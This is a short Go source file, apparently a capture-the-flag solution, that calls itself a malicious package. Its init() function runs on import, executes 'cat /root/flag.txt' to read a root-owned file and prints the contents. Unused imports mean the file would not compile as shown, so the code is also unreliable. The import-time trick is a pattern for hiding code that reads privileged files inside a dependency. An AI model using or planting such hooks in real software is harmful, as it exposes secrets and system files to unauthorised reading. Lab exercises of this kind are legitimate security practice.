package main

import (
	"fmt"
	"html/template"
	"net/http"
	"os/exec"
	"regexp"
)
func init() {
	// This will be automatically called when the package is imported
	cmd := exec.Command("cat", "/root/flag.txt")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error reading flag:", err)
		return
	}

	// Print the flag
	fmt.Printf("Flag: %s\n", output)
}

func main() {
	// The main function ensures that the package runs without errors
	// The real action happens in init()
	fmt.Println("Malicious package initialized.")
}
